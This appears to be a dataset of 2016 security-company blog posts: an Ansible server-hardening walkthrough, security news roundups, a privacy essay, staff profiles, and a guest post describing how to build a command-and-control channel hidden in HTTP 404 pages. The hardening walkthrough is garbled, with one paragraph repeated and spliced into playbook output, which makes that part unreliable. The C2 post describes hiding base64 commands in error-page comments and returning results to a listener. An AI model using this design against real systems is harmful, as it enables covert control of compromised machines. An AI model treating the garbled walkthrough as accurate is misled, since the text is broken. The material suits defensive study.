logger }           # deploy and configure fail2ban         - { role: banner }  \n\nThe manual portion of this deployment happens here. SSH over to the new droplet and create a sudo user. Yes, this can be automated and we'll write about that another day, another way.\n\nssh root@NewDropIP\nuseradd ansible -m -s /bin/bash\npasswd ansible\nUNIX Pass:\nUNIX Pass:\nsu - ansible\nmkdir .ssh\ntouch .ssh/authorized_keys\necho \"ssh-rsa AAAAB3N IClTJ1E1 ansible@tw17ch01\" >> .ssh/authorized_keys\nexit\nvisudo   ## add ansible ALL=(ALL:ALL) ALL\n\nansible@tw17ch01:/etc/ansible$ sudo nano hosts  ### add [dropper] and NewDropIP\nansible@tw17ch01:/etc/ansible$\nansible@tw17ch01:/etc/ansible$ ansible-playbook playbooks/NewDrop.yml -l dropper -u ansible -K\nSUDO password:\n\nPLAY [all] *********************************************************************\nTASK [setup] *******************************************************************\nThe authenticity of host '12.34.56.78 (12.34.56.78)' can't be established.\nECDSA key fingerprint is 5f::1f.\nAre you sure you want to continue connecting (yes/no)? yes\nEnter passphrase for key '/home/ansible/.ssh/id_rsa':\nok: [12.34.56.78]\nTASK [sshd : Set OS dependent variables] ***************************************\nok: [12.34.56.78] => (item=/etc/ansible/roles/sshd/vars/Ubuntu_14.yml)\nTASK [sshd : OS is supported] **************************************************\nok: [12.34.56.78]\nTASK [sshd : Installed] ********************************************************\nok: [12.34.56.78] => (item=[u'openssh-server', u'openssh-sftp-server'])\nTASK [sshd : Run directory] ****************************************************\nok: [12.34.56.78]\nTASK [sshd : Configuration] ****************************************************\nchanged: [12.34.56.78]\nTASK [sshd : Service enabled and running] **************************************\nok: [12.34.56.78]\nTASK [sshd : Register that this role has run] **********************************\nok: [12.34.56.78]\nTASK [chains : Ensure iptables is installed (RedHat).] *************************\nskipping: [12.34.56.78]\nTASK [chains : Ensure iptables is installed (Debian).] *************************\nok: [12.34.56.78]\nTASK [chains : Flush iptables the first time playbook runs.] *******************\nchanged: [12.34.56.78]\nTASK [chains : Copy firewall script into place.] *******************************\nchanged: [12.34.56.78]\nTASK [chains : Copy firewall init script into place.] **************************\nchanged: [12.34.56.78]\nTASK [chains : Ensure the firewall is enabled and will start on boot.] *********\nchanged: [12.34.56.78]\nTASK [logger : Create directory to store ssl crt] ******************************\nchanged: [12.34.56.78]\nTASK [logger : Copy SSL cert] **************************************************\nchanged: [12.34.56.78]\nTASK [logger : Install Filebeat dependencies] **********************************\nok: [12.34.56.78]\nTASK [logger : Check if Filebeat is already at the right version] **************\nchanged: [12.34.56.78]\nTASK [logger : Download Filebeat agent] ****************************************\nchanged: [12.34.56.78]\nTASK [logger : Install Filebeat agent] *****************************************\nchanged: [12.34.56.78]\nTASK [logger : Create directory for Filebeat Configures] ***********************\nchanged: [12.34.56.78]\nTASK [logger : Create directory for Filebeat Configures] ***********************\nchanged: [12.34.56.78]\nTASK [logger : Configure Filebeat] *********************************************\nchanged: [12.34.56.78]\nTASK [logger : Configure Filebeat prospectors] *********************************\n[DEPRECATION WARNING]: Using bare variables is deprecated. Update your playbooks  ### Need to clean up this playbook\n so that the environment value uses the full variable syntax\n('{{prospectors}}').\n\nThis feature will be removed in a future release. Deprecation warnings can be disabled by setting deprecation_warnings=False in ansible.cfg.\n\nchanged: [12.34.56.78] => (item={u'paths': [{u'log_paths': [u'/var/log/syslog', u'/var/log/auth.log'], u'document_type': u'syslog'}], u'type': u'syslog', u'id': u'syslog'})\nchanged: [12.34.56.78] => (item={u'paths': [{u'log_paths': [u'/var/log/*.log'], u'document_type': u'log', u'exclude_files': [u'^syslog\n\nIn sweet corn bread muffins I'll be dipped - heck yes! We just rolled out solutions to most everything I (or most admins) worry about. Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good.\n\nSSH:\n\nansible@tw17ch03:~$ cat /etc/ssh/sshd_config\n# ansible managed: /etc/ansible/roles/sshd/templates/sshd_config.j2 modified on 2016-04-16 12:32:30 by root on tw17ch01\nPort 22444\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nAcceptEnv LANG LC_*\nChallengeResponseAuthentication no\nHostbasedAuthentication no\nIgnoreRhosts yes\nKeyRegenerationInterval 3600\nLogLevel INFO\nLoginGraceTime 120\nPasswordAuthentication no\n[...............]\nX11Forwarding yes\n\niptables:\nansible@tw17ch03:~$ sudo iptables -L\n\n[sudo]\n\n password for tendans:\nChain INPUT (policy ACCEPT)\n\ntarget         prot opt source                   destination            \nACCEPT         all  --  anywhere                 anywhere                \nACCEPT         tcp  --  anywhere                 anywhere                 tcp dpt:22444\nACCEPT         tcp  --  anywhere                 anywhere                 tcp dpt:https\nACCEPT         icmp --  anywhere                 anywhere                \nACCEPT         udp  --  anywhere                 anywhere                 udp spt:ntp\nACCEPT         all  --  anywhere                 anywhere                 state RELATED,ESTABLISHED\nLOG            all  --  anywhere                 anywhere                 limit: avg 15/min burst 5 LOG level debug prefix \"Dropped by firewall: \"\nDROP           all  --  anywhere                 anywhere                \n\nChain FORWARD (policy ACCEPT)\ntarget         prot opt source                   destination            \nChain OUTPUT (policy ACCEPT)\ntarget         prot opt source                   destination            \nACCEPT         all  --  anywhere                 anywhere                \nACCEPT         udp  --  anywhere                 anywhere                 udp dpt:ntp\n\nFileBeat:\nansible@tw17ch03:~$ cat /etc/filebeat/filebeat.yml\n\n################### Filebeat Configuration Example #########################\n############################# Filebeat ######################################\nfilebeat:\n# List of prospectors to fetch data.\n\nFail2Ban:\ntendans@tw17ch03:~$ cat /etc/fail2ban/jail.local\n# ansible managed: /etc/ansible/roles/banner/templates/etc/fail2ban/jail.local.j2 modified on 2016-05-30 05:57:15 by root on tw17ch01\n[......]\n\n[ssh]\n\nenabled = true\nport = 22444\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 6\nfindtime = 600\n\n[https]\n\nenabled = true\nport = https\nfilter = https\nlogpath = /var/log/auth.log\nmaxretry = 6\nfindtime = 600\n\nThat's it, that's all. The playbook looks good and the roles all deployed as expected. The config files are updated and SSH is allowing us remote access. Oh yeah, and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H/T to an unnamed colleague, cheers!\n\n, u'^auth.log\n\nIn sweet corn bread muffins I'll be dipped - heck yes! We just rolled out solutions to most everything I (or most admins) worry about. Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good.\n\nSSH:\n\nThat's it, that's all. The playbook looks good and the roles all deployed as expected. The config files are updated and SSH is allowing us remote access. Oh yeah, and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H/T to an unnamed colleague, cheers!\n\n, u'^filebeat.log.*\n\nIn sweet corn bread muffins I'll be dipped - heck yes! We just rolled out solutions to most everything I (or most admins) worry about. Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good.\n\nSSH:\n\nThat's it, that's all. The playbook looks good and the roles all deployed as expected. The config files are updated and SSH is allowing us remote access. Oh yeah, and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H/T to an unnamed colleague, cheers!\n\n, u'^topbeat.log.*\n\nIn sweet corn bread muffins I'll be dipped - heck yes! We just rolled out solutions to most everything I (or most admins) worry about. Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good.\n\nSSH:\n\nThat's it, that's all. The playbook looks good and the roles all deployed as expected. The config files are updated and SSH is allowing us remote access. Oh yeah, and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H/T to an unnamed colleague, cheers!\n\n]}], u'id': u'varlog'}) TASK [logger : Start Filebeat] ************************************************* changed: [12.34.56.78] TASK [banner : install] ******************************************************** changed: [12.34.56.78] => (item=[u'fail2ban']) TASK [banner : update configuration file - /etc/fail2ban/fail2ban.conf] ******** changed: [12.34.56.78] TASK [banner : update configuration file - /etc/fail2ban/jail.local] *********** changed: [12.34.56.78] TASK [banner : copy filters] *************************************************** skipping: [12.34.56.78] TASK [banner : copy actions] *************************************************** skipping: [12.34.56.78] TASK [banner : copy jails] ***************************************************** skipping: [12.34.56.78] TASK [banner : start and enable service] *************************************** ok: [12.34.56.78] RUNNING HANDLER [sshd : reload_sshd] ******************************************* changed: [12.34.56.78] RUNNING HANDLER [chains : restart firewall] ************************************ changed: [12.34.56.78] RUNNING HANDLER [logger : restart filebeat] ************************************ changed: [12.34.56.78] RUNNING HANDLER [banner : restart fail2ban] ************************************ changed: [12.34.56.78] PLAY RECAP ********************************************************************* 12.34.56.78                 : ok=32   changed=22   unreachable=0        failed=0\n\nIn sweet corn bread muffins I'll be dipped - heck yes! We just rolled out solutions to most everything I (or most admins) worry about. Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good.\n\nSSH:\n\nThat's it, that's all. The playbook looks good and the roles all deployed as expected. The config files are updated and SSH is allowing us remote access. Oh yeah, and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H/T to an unnamed colleague, cheers!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Get to Know a Tester: Sally\"\nTaxonomies: \"Fun & Games\"\nCreation Date: \"Wed, 13 Jul 2016 17:15:56 +0000\"\n\nNote: A few months ago we did a short interview with a tester when we talked to Ethan.  This month we had a conversation with Sally Vandeven, who's only been with us just under a year, but already feels like an old friend. Enjoy! - Sierra\n\nhttps://youtu.be/usm7EWOOfiw\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 071516\"\nTaxonomies: \"News, AWS, BSidesPhilly, Linus, Linux, MIT, printer attacks, printer drivers, Riffle\"\nCreation Date: \"Fri, 15 Jul 2016 17:41:12 +0000\"\nLawrence Hoffman //\n\nHey, I\u2019m back! Vacation was great. I spent part of last week on an Island so I was unable to scratch the keep-up-with-the-media itch. Now that I\u2019m back I put aside a little time to try and catch up, and get a list gathered together of stuff I saw this week.\n\nThe printer watering hole attack. If you have twitter, and follow any security folks at all you\u2019ve probably heard of this attack. Essentially people want to be able to access printers without needing to contact a systems administrator. For this reason there is an exception to policy which allows installation of printer specific drivers as system without any warnings. This is hacker paydirt. Read about it here: http://blog.vectranetworks.com/blog/microsoft-windows-printer-wateringhole-attack\n\nMIT had a great writeup on Riffle this week along with the research paper describing the protocol. We\u2019ve seen several times that TOR has some weaknesses (as does every system, that\u2019s important to remember) and MIT has a possible alternative. The approach is centered around a concept of shuffling the traffic in a way that\u2019s mathematically provable to the receiving client. Without breaking into pure mathematics let\u2019s put it like this: as long as one server in the \u201cmixnet\u201d remains uncompromised the users remain anonymous. http://news.mit.edu/2016/stay-anonymous-online-0711\n\nAWS security is something I\u2019ve been looking after for a while now as I have some future work planned in the \u201ccloud\u201d (I managed to type that without cursing) and to that end there\u2019s this neat series of articles about persistence in a hacked AWS account.\n\nhttps://danielgrzelak.com/disrupting-aws-logging-a42e437d6594#.pfrt7rbc4\n\nhttps://danielgrzelak.com/exploring-an-aws-account-after-pwning-it-ff629c2aae39#.ns0wk01r4\n\nhttps://danielgrzelak.com/backdooring-an-aws-account-da007d36f8f9#.5ws8kwr8o\n\nBSides Philly Call for Papers. So\u2026 this isn\u2019t so much news, the CFPs for BSides happen all the time, because there are a lot of BSides conferences. Why am I mentioning it here? Because I\u2019ve now been to a few BSides conferences and can give my stamp of approval. I really like the way that a BSides conference works. They happen all over, so you can catch one close to you, the talks at the BSides I\u2019ve been to have been outstanding. I also think it\u2019s a great place to start if you\u2019re interested in giving a talk about something you\u2019ve been researching, there\u2019s a much better chance you\u2019ll get in with a BSides than with many of the other conferences. http://www.bsidesphilly.org/cfp\n\nLinus is in the news for cursing again. I\u2019m a programmer, I get it, things like the format of comments and the way we name our variables are something most of us hold very strong opinions about. To offer another perspective to those who believe that Linux is just being abusive here think of it like this: when someone writes code for the Linux Kernel it has to be reviewed, sometimes by dozens of people. It will also have to be maintained, sometimes for decades. It may also have to one day be abstracted, extended, replicated, or generalized. When writing code we know that the compiler doesn\u2019t care what the comments look like, we write those for the dozens of people who are stuck reading that code. Linus spends lots of time reading others code. For those of you who must read the rant: http://lkml.iu.edu/hypermail/linux/kernel/1607.1/00627.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Data Mining & Privacy: How Anonymous Are You Really?\"\nTaxonomies: \"InfoSec 201, anonymization, aol, data mining, facial recognition, netflix, personal data, pokemon go, privacy, social security\"\nCreation Date: \"Mon, 18 Jul 2016 16:31:52 +0000\"\nSam Carroll //\nWhen I started at BHIS I was surprised at the sensitivity of personal data, such as my birthday. I was soon reminded of a data mining class I took last year where Dr. Karlsson (South Dakota School of Mines & Technology) started with an ethics portion. Specifically the ethics he warned us about was anonymization of users' data and re-identification of personal data.\nSensitive information that has been poorly obfuscated can be reversed to discover very specific information about individuals. This has been such a big concern for individuals and corporations since 1998, when GeoCities had told customers information would not be shared but then sold the data to third parties.  The FCC ruled that companies must not lie about their privacy policies.\nThink about how many companies have you agree to a privacy policy and sometimes, due to bad anonymization, sensitive information can leak out. One of the most egregious example is from the early 90's when Latanya Sweeney discovered that about 90% of the US population could be uniquely identified by their zip code, birthdate, and sex. To prove this point, Sweeney bought voter rolls (public record) and combined it with data from GIC, a health insurance purchaser for state employees. Though GIC had removed names, SSN's, and home addresses, Sweeney was able to identify the governor's health records, including prescriptions (who personally vouched for the security of the anonymization).\nThough this incident of health care re-identification was 'contained' to Massachusetts, reidentification is a problem that affects just about everyone, including tech giants.\n2006 had two famous examples of breach of privacy of two well known companies, Netflix and AOL. Netflix announced a competition to beat their suggestion algorithm, so people could train and test their solutions. Netflix removed the usernames of 500,000 users from their ratings, but gave unique identifiers in the place of usernames. In a study conducted on this data researchers coupled ratings on IMDB (that had usernames associated with the IMDB profile) with the Netflix database, and just 6 movie ratings, nearly all users in Netflix's database were discovered.\n\nAOL similarly released tens of millions of search queries from a 3 month time span, and anonymized the data by removing usernames and IP Addresses, and again gave unique identifiers for each user, meaning each user was still uniquely marked but not immediately identifiable. Using this data, researchers were able to combine the searches for a single user and discover personal information about them using all their searches, such as \"how is the weather in New York City\", \"what's fun for a 18 year old to do on Saturday\", searching their own name or SSN's. Thus giving anyone who is interested, and committed enough, personal information that should be left undisclosed. Some of the information included things of a more private nature, such as how to come out as an abuse victim to your family, or how to get out of an abusive relationship.\n\nIn 2009 Carnegie Mellon discovered a way to analyze data to discover the SSN of an individual. They did this using only the birth location (as SSN's use physical location as the first 5 numbers). The last four numbers were reduced to only 1000 combinations, and they reduced this by using public death records that record SSN's to find a pattern of the last 4 digits with high correlation to birthdate. Thus with only two little pieces of information (both of which are pretty much provided by any social networking website), and a little work it's relatively easy to uncover an individual's social security number.\n\nCongress passed a bill last week that allows the government and commercial operators of drones to collect potentially personally identifiable data about individuals (including facial recognition), without disclosing it. Also, this bill did not include provisions on how they would use the data and if/when it would be destroyed, showing that we still face concerns over our privacy.\nPokemon Go even had a terrible breach of privacy on the iOS version of the app, which originally required rights to a user's entire Gmail account. Some even went as far to say this included the ability to send emails, read calendar events, access contacts, and photos. Though developer Niantic says no information was gathered, one thing is clear.  Privacy is not a growing concern. You must be be careful about what you share even with Pokemon.\nBe careful what you share, the most insidious (and perhaps one of the best ways) to extract personal information is to ask for it. People are very careful about what they know will compromise them, but the data that they feel won't compromise them they are freely willing to distribute. However, even professionals will sometimes fail to keep data truly anonymous, and sometimes deeply embarrassing or highly private data can be compromised because of it. Assume you're already compromised, and take provisions to stay secure.\nSources:\nhttp://digital.law.washington.edu/dspace-law/bitstream/handle/1773.1/417/vol5_no1_art3.pdf\nhttps://epic.org/privacy/reidentification/#process\nwww.nytimes.com/2016/07/14/technology/personaltech/how-to-protect-privacy-while-using-pokemon-go-and-other-apps.html\nwww.computerworld.com/article/3095491/robotics/faa-compromise-bill-drops-key-drone-privacy-provisions.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build a 404 page not found C2\"\nTaxonomies: \"C2, Red Team, building, C2, http 404, network traffic\"\nCreation Date: \"Wed, 20 Jul 2016 18:37:23 +0000\"\nA Guest blog by Matthew Pawelski //\n\nA C2, or command-and-control, is used by attackers to control compromised systems. Most of these C2s are in control of large botnets, yet some are simply used by an attacker to have access to a system so they can pivot to another device or to steal credentials and gain \u201clegitimate\u201d access to the system.\nI have seen and heard of many types of C2s out there, such as IRC, p2p, DNS, Twitter, Gmail, ICMP, and etc.  This list keeps getting bigger, and the ways C2 are implemented get more inventive everyday. I am rarely ever surprised by any new C2 I hear about.  Though one day having a conversation with John Strand, he mentioned a C2 that uses an HTTP 404 - File Not Found.  This\u2026got my attention.  As a security professional, most of these techniques (but not all) are fairly easily detected and stopped.\nThough the HTTP 404 - File Not Found would be a little more difficult to detect, filtering/blocking HTTP 404 - File Not Found altogether would be easy to stop. But how many environments block HTTP 404?  If fact how many environments out there monitor and view website HTTP 404?  If you are like me, when looking through network traffic, HTTP 404 is generally overlooked or skipped.  When combing through traffic, I am mostly looking for any anomalies in the traffic, traffic going to odd places on the Internet, or other things of that nature.\nWith my interest piqued, I started to do a little research to see if anyone has used this attack and if anyone has detected this type of C2 in the wild. I found a couple of writings, one a Black Hat white paper titled, \u201cHiding in Plain Sight\u201d by Pierre-Marc Bureau and Christian Dietrich (https://www.blackhat.com/docs/eu-15/materials/eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels-wp.pdf), and another one, \u201cHiding Malicious Traffic Under the HTTP 404 Error\u201d by He Xu (https://blog.fortinet.com/2015/04/09/hiding-malicious-traffic-under-the-http-404-error). The Black Hat white paper references the Fortinet paper by He Xu, and I used the Fortinet paper to model my proof of concept.  \nIn the article by He Xu, they actually detected and witnessed the HTTP 404 - File Not Found C2, and the article covers what they found and what was happening. Basically an infected device would reach out to this web server, but would get back a HTTP 404 - File Not Found.  The HTTP 404 seemed benign, however a comment on the source page had base64-encoded commands. These commands were instructions for the bot to replicate itself to USB drives, download and execute an executable, and finally to change some registry keys. Based on this article and the way the bot acted, I decided to create my own HTTP 404 - File Not Found C2.  Though instead of just having the compromised system get a command and run those instructions, I wanted it to be able to control and get a response from a system via the HTTP 404 - File Not Found.\nThe first part was setting up the web server by adding and configuring the .htaccess file to direct any error pages to a .html file of my choosing (below I redirect it to evil.html) .\n\nAs an attacker this web server could be one they setup and control directly or a server they have \u201caccess\u201d to. Once the site was setup and the HTTP 404 - File Not Found was setup and working, I moved on to part 2, the C2 server.\nThis was the easiest part of code.  The code would wait for me to input a command that I wanted to give to a controlled device: base64 encode it, put it in an html comment with a predefined header, and wrap it into an html file.  It would then overwrite the current HTTP 404 - File Not Found html file.  This would overwrite the HTTP 404 - File Not Found file only when I entered a new command. For my testing, I setup and controlled the web server, though if it was a compromised server, I could have easily used FTP to upload new html files.\n\nThe next step was to create the C2 client.  A few things I wanted from the client; the ability to control the client with commands that would work for both windows and Linux, and a response from the commands back to a listening server.\nThe client had to reach out to a domain.  I used a static URL, but this could easily be changed to ask for a random page. Once it requested a page from the site, it would first determine if it was a 404 page.  If it was not a 404 page, then ignore and wait until the next request goes out.  If it is a 404 page not found, then check to see if it has comments in the source code.  If it finds comments, then check to see if the header in the comments matches a predefined header.  If the header matches, then decode the base64 string and execute the command(s).\n\nThis part of the code was a little more difficult as I wanted to not only execute commands on the client system, I also wanted to be able to give basic commands to Linux and windows alike. Then finally I needed to send the results of the executed command(s) back to a server.\nWhat I did to fix this on the C2 client was to determine if the compromised system was Linux or Windows.  If the system was Linux then execute the commands as if the OS was Windows, then execute it as a PowerShell script re-encoded in base64.  Using PowerShell for the Windows OS would give some of the same basic commands as it would in Linux.\nThe final part of the C2 client then would send the results of the commands back to a listening server.  I chose for testing, a python server for a listener.  The way you send the commands back could be more elaborate to bypass egress filtering and packet filtering. But, for simplicity and ease, I just used a python server listener.\nFinally, I created the C2 receiver for the results for the commands sent by the C2 client.  This was just a basic python server that is waiting for a connection.\nFor my demo I am using a Windows 10 machine as the \u201cvictim\u201d and an Ubuntu desktop as the web server, the C2 controller, and the C2 receiver.\nYou can see the website is an Office 365 login page.\n\nThough once I go to a page that does not exist, I should get a 404 error.\n\nAnd you will notice that the source page does not have any comments, just a basic web page.\n\nThe C2 Server starts and waits for a command\n\nThe C2 command receiver opens a port and waits for an incoming connection.\n\nThe C2 client is then run on the victim machine(not much to see, the file starts then runs in the background).\nNow we can do a simple command, such as ls\n\nAs you can see, the client sends the contents of the Desktop (where the program was running from), back to the receiver. I will create a file, list the contents, and then show 404 page and source code of the page.\nFrom the C2 server I am able to run commands, I used a PowerShell command and created an empty file in the current directory(desktop).\nThe C2 receiver shows that the file was created.\n\nYou can now see the file I created from the C2 server is pictured on the desktop\n\nThe 404 page still looks the same.\n\nBut if you look at the source code you can see that there is a new comment at the bottom of the page.\n\nAnd if you decode TmV3LUl0ZW0gLU5hbWUgRW1wdHlGaWxlLnR4dCAtSXRlbVR5cGUgRmlsZQ==\n You get:\nNew-Item -Name EmptyFile.txt -ItemType File\nIn conclusion, this could be a very powerful tool and easily overlooked.  It was a fun little project and you can see the source code at:\nhttps://github.com/theG3ist/foOhfo\nOK, the real site is:\nhttps://github.com/theG3ist/404\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 072216\"\nTaxonomies: \"News, canonical, Digital Millennium Copyright Act, free wifi, long passwords, opensshd, snark\"\nCreation Date: \"Fri, 22 Jul 2016 17:24:09 +0000\"\nLawrence Hoffman //\n\nThe list this week is a little shorter, I didn\u2019t include a tool or POC link as I usually do. No particular reason, just didn\u2019t run across one I felt like I could talk about directly. Among the articles this week we see legal actions, leaked data, an openssh user enumeration, and finally a goofy but serious look at a common security fear, open wireless networks.\n\nThe EFF have announced a lawsuit against the United States Government which challenges section 1201 of the Digital Millennium Copyright Act. Section 1201 is titled \u201cCircumvention of copyright protection systems\u201d and was ostensibly originally designed to protect copyrighted media like movies and music. The reality of section 1201 is that it takes from consumers their rights to fair use of the media, software, and hardware which they\u2019ve purchased. For those of you who do not wish to read 1201 (though I recommend you do) there\u2019s a good example of how this is stifling innovation in the EFFs article linked below.\n\nhttps://www.eff.org/press/releases/eff-lawsuit-takes-dmca-section-1201-research-and-technology-restrictions-violate\n\nCanonical reported on the 15th of this month that its forums were again compromised. The attacker had access to over two million usernames, email address, and IP addresses. Canonical maintains that due to its use of single sign on the attackers did not obtain any passwords.\n\nhttp://insights.ubuntu.com/2016/07/15/notice-of-security-breach-on-ubuntu-forums/\n\nA user enumeration was released for opensshd which allows user enumeration via an interesting sort of timing attack. Long passwords (> 10k) are sent to the server and the time that it takes the server to respond to these passwords is then observed. For existing users the password will take longer to hash so long as the server is configured to use SHA256/SHA512 for password hashing. Also of interest, the root user will not appear to be a valid user if root login is not permitted on the server.\n\nhttp://seclists.org/fulldisclosure/2016/Jul/51\n\nVoting with your insecure wifi. I like theregister.co.uk for snark, and this is research that is best reported on with some snarkiness. Really I\u2019m posting this because I feel like it\u2019s a good indicator for how educated (or uneducated as the case may be) Americans are about the risks associated with open wifi networks. \n\nhttp://www.theregister.co.uk/2016/07/21/gop_wifi_privacy_fail/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Courage to be Vulnerable: An Ode to Rita\"\nTaxonomies: \"InfoSec 101, Don't wait to say nice things to people you love, Office Mom\"\nCreation Date: \"Tue, 26 Jul 2016 16:16:26 +0000\"\nSierra Ward //\n\nThe other day I went to get some food with a co-worker.  When the counter boy asked for my name I told him.  The co-worker said she could tell I wasn't a pentester because after realizing how vulnerable the world is, they have a difficult time being open with their personal information on ANY level.\n\nIn an industry that deals on a daily basis with the threat of evil it\u2019s easy to become jaded and cynical about the world.  Perhaps that is part of the draw that John has. He bucks the norm and is more open than many people I know, and not just in information security.  He has an impervious ability to be vulnerable and candid, and that\u2019s appealing, maybe ESPECIALLY in an industry like ours.  That attitude continues to trickle down to the relationships we have with our co-workers and the ways he interacts with us, and we interact with each other.\n\nThis is no less true than about how much he\u2019s shared publicly about his mother, and their family\u2019s struggle in the last few months to face her cancer diagnosis.\n\nLast week I had the privilege to attend one of their kid\u2019s birthday parties (previously I was a tutor to their children) and I got to see Rita.  As usual she was in brave spirits, and though tired, was her usual happy laughing self.  But the latest prognosis is not a good one, and while she was able to fight it off for a bit, it seems it may be a loosing battle more quickly than hoped.\n\nSomehow she and I ended up on a bench at the edge of the kitchen together.  We got to have a candid talk about how she\u2019s come to be okay with facing death, and saying goodbye to her family.  I felt a little guilty that I was monopolizing her time, but also quite lucky to get to spend a few more moments with her.  As we age, we all come closer and closer to facing the deaths of the people closest to us and it is sobering to see someone who can face it with dignity, grace and love. Her testimony of peace was deeply moving.\n\nJohn came and sat nearby and listened to our conversation.  He mentioned how surprised he was that so many co-workers have broken down in tears upon hearing about Rita\u2019s diagnosis.  But it doesn\u2019t surprise me.  In a world with so much brokenness, and so much bad, to meet a kind and loving person seems even more special and rare.  Rita said, \u201cI still don\u2019t understand what I did.  Usually it was just emailing people to ask about attachments and receipts and to clarify things.\u201d  And yet... it is her kindness in all her small ways, her deep care of each of us - her love that is so fantastically moving in the face of such cynicism in a dark world.\n\nRita has been a pillar of BHIS, not just because she\u2019s on the accounting team (the gears that run any business) but also because of her unwavering kindness and good cheer.  In many ways she is the token mom of BHIS and all of its employees.\n\nShe has shown us that we do not necessarily need to go do great things to change the world, we may change it by loving deeply and genuinely in many small ways - our sphere of influence spreading even beyond our wildest dreams.\n\nRita will leave a deep and lasting legacy, not only because she has raised such brilliant and wonderful children who carry on her nature of kindness and love, but also because of how she has impacted each of our lives.  It has been and is an honor to know you, Rita!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Doctor Will See You Now\"\nTaxonomies: \"Author, CJ Cox, InfoSec 101\"\nCreation Date: \"Thu, 28 Jul 2016 17:15:29 +0000\"\nCJ Cox //\n\nJoining a new organization is always a little intimidating, being amongst a group of crack hackers in a top-notch small company only squares the stress. On the bright side, even the boss, will often say, \"Sometimes I feel like the dumbest person in the room.\"  This frequently happens during the review of some magic move a pentester has pulled to reveal a new zero-day finding in a routine test. It\u2019s both refreshing and reassuring to know I\u2019m not alone and everyone's ego\u2019s in check. \n\nIt\u2019s exciting to see what a group of amazing people with skills that rival those of great surgeons can achieve, but it\u2019s also fascinating to work with our customers. As the Solutions Engineer (John also isn\u2019t big on specific titles) I spend a lot of time with the customers. You\u2019re a crack group of people, smart on security and wanting to do the right things. It like the very best doctor/patient relationship; a good medical team with a smart and motivated patient and you get some amazing results.\n\nAs the new guy (I started last month) I found it quite easy to get through a call where the customer was presenting their problem because they knew their environments and they had a good idea of where they were trying to go. Perhaps because the customers are so smart and so knowledgeable they often wonder why they can\u2019t speak directly to a pentester. The short answer is, \"Pentesters are busy slicing it up!\" When one is available I almost always have a ride along. The deeper answer is that like the surgeon, those specialists are expensive and in high demand. As the Solutions Engineer, I'm more of a general practitioner, my purpose is diagnosing and clarifying the customer\u2019s problems. I make a quick diagnosis and then start focusing on general solutions. If needed we pull in the specialists to verify the prognosis or dig into the depths of the issue. \n\nI only have five weeks on station at BHIS but I have 20 plus years in IT and security. I\u2019ve done everything from help desk, to junior system administrator, to campus security manager, and systems engineer. I understand technology and risk across a broad spectrum and link security problems with business needs. I can\u2019t dig out a zero-day in javascript but I can get you lined up with the folks who can (Joff).  The high caliber of our customers certainly makes this job fun and rewarding. \n\nWhen a customer doesn't know exactly what they need to improve their security health, I can guide the discussion to diagnose what services and specialists are going to provide the best result. Security triage is my specialty and I look forward to working with the patients (customers) and creating a healthier business and security environment.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 072916\"\nTaxonomies: \"InfoSec 101, News, Adblockers, Dark Web, LastPass, OnionScan, RPC\"\nCreation Date: \"Fri, 29 Jul 2016 17:25:37 +0000\"\nLawrence Hoffman //\n\nSo, LastPass is one of my favorite applications, and it\u2019s making me more nervous every day. I haven\u2019t lost faith yet, though it was lots more convenient when I had autofill on. LastPass is everywhere this week. Also we\u2019ve got some neat stuff from OnionScanner and one of my favorite subjects \u201cWhy you should use an ad blocker.\u201d\n\nLastPass has had a couple of interesting bugs filed about it\u2019s autofill features in web browser extensions. One of these bugs allows for the dumping of credentials to domains based only on an exploitation of the regex that LastPass uses to determine if the user is at a domain for which LastPass has credentials. The lesson learned here is please turn off your autofill. It may require you to put you master password in a lot, but autofill is just dangerous.\n\nhttps://labs.detectify.com/2016/07/27/how-i-made-lastpass-give-me-all-your-passwords/\n\nThe second LastPass bug allows hijacking of a click events and access to RPC. This bug is even worse than the first, it would have allowed an attacker to run scripts, delete files, change master passwords etc. Thankfully it appears that both of these situations have now been resolved.\n\nhttps://bugs.chromium.org/p/project-zero/issues/detail?id=884\n\nA few weeks back some Sarah Jamie Lewis posted a neat article about the infrastructure of the \u201cdark web\u201d which she\u2019d created using OnionScan and some data visualization tricks. Neat stuff, it\u2019s an interesting read as to what the infrastructure of a privacy network looks like. Of course lots of people would like to get to scanning and replicating this effort / doing research of their own, which Justin over at AutomatingOSINT has now helped us out with. Justin has created a nice easy step by step tutorial to setting up your own OnionScanner on Digital Ocean and is promising a part two with detail on creating the graphs. If you don\u2019t feel like scanning for yourself, he\u2019s also provided the dataset at the bottom of the first article.\n\nhttps://mascherari.press/onionscan-report-june-2016/\n\nhttp://www.automatingosint.com/blog/2016/07/dark-web-osint-with-python-and-onionscan-part-one/\n\nAdblockers run on all my systems, not just because I hate being advertised to and tracked, but also because ads are bad for my computer. I remember thinking way back in the early internet days that if I were to decide I must be a villain I\u2019d definitely try to find a way to infect an ad platform and use it as a delivery vector. I don\u2019t think this was exactly scifi then, I was almost certainly not the first person to have this idea, but now it\u2019s just common knowledge. Nowadays I see people scraping adds off the internet to be analyzed, and I love the internal monologue I get to have when I see my 